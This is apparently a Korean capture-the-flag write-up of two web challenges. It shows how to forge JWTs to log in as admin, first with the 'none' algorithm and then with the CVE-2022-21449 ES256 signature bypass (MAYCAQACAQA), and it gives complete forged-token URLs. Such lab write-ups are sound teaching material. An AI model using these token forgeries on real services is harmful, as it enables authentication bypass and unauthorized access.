## jalyboy-baby | web

Nong-alg JWT를 이용해서 로그인을 우회하는 문제이다.

<br>

접속하면 URL 파라미터에서 JWT를 확인할 수 있다.

guest JWT: `eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4`

<br>

이를 🔗[jwt.io](https://jwt.io/) 에 올려보거나, 직접 base64 디코딩는하는 방법으로 값을 확인한다.

```

$ echo eyJhbGciOiJIUzI1NiJ9 | base64 -d
{"alg":"HS256"}

$ echo eyJzdWIiOiJndWVzdCJ9 | base64 -d
{"sub":"guest"}

$ echo rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4 | base64 -d
�B��0����Az(D�l��,
                  ��!��}~base64: invalid input

```

<br>

JWT 서명 관련 취약점을 찾아보던 중, None alg로 이를 우회할 수 있다는 글을 발견했다. 

 

🔗[https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771)

<br>

위 글을 참고하여 JWT를 수정한다.

```

$ echo -n '{"typ":"JWT","alg":"none"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=  (=는 제거한다.)

$ echo -n '{"sub":"admin"}' | base64
eyJzdWIiOiJhZG1pbiJ9

```

=> `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9` (시그니처는 없기 때문에 비워둔다)

<br>

최종 쿼리는 아래와 같다.

```
http://34.84.28.50:10000/?j=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9
```

<img src="https://github.com/user-attachments/assets/cc4c6c79-6325-41dd-b8b6-d0051599ebb1" width=500>

<br>
<br>

## jalyboy- jaligirl

CVE-2022-21449 로 풀 수 있는 문제이다

이전 문제와 다르게 token의 서명 부분이 랜덤으로 주어진다.

```

eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.
567Iblho8boW0SVvDYrHx573LxG7_WVRUnwSyRj8TlAXcIZ2lpGhx6OAEpklTam89CmYlLBbKLdD-BiQpmedmw

```

<br>

또다른 차이점은 사용하는 알고리즘이다. 이 문제에서 사용한 jwt알고리즘은 es256 이다.

```

$ echo eyJhbGciOiJFUzI1NiJ9 | base64 -d
{"alg":"ES256"}

$ echo eyJzdWIiOiJndWVzdCJ9 | base64 -d
{"sub":"guest"}
 
```
 
<br>

es256을 사용하는 jwt 의 취약점에 대해 찾아보던 중 서명 부분에 MAYCAQACAQA를 넣으면 우회가 된다는 포스트를 발견했다. (=CVE-2022-21449)

🔗[https://github.com/ticarpi/jwt_tool/issues/65](https://github.com/ticarpi/jwt_tool/issues/65)

🔗[https://github.com/jwtk/jjwt/issues/726](https://github.com/jwtk/jjwt/issues/726)

<br>

MAYCAQACAQA를 사용하여 es256 서명을 우회할 수 있었다.

```
http://34.85.123.82:10001/?j=eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.MAYCAQACAQA
```

<img src="https://github.com/user-attachments/assets/c683fafc-f57a-4c5a-8b6b-c52ed3592c09" width=500>
